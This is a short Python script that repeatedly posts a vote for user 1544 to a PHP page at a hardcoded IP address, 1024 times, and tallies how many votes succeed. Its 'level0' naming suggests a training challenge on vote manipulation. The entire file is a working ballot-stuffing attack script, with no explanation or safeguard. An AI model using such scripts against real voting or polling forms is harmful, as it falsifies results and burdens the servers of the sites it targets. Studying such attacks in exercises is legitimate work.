#!/usr/bin/python3
import requests
success = 0
failures = 0

print("Starting Count...")

for _ in range(1024):
    r = requests.post("http://158.69.76.135/level0.php",
                      data = {'id': '1544', 'holdthedoor': 'submit'})
    if (r.status_code == 200):
        success = success + 1
    else:
        failures = failures + 1
print("you voted {} times for 1544 user". format(success))
print("Successes {}\nFailures - {}".format(success, failures))
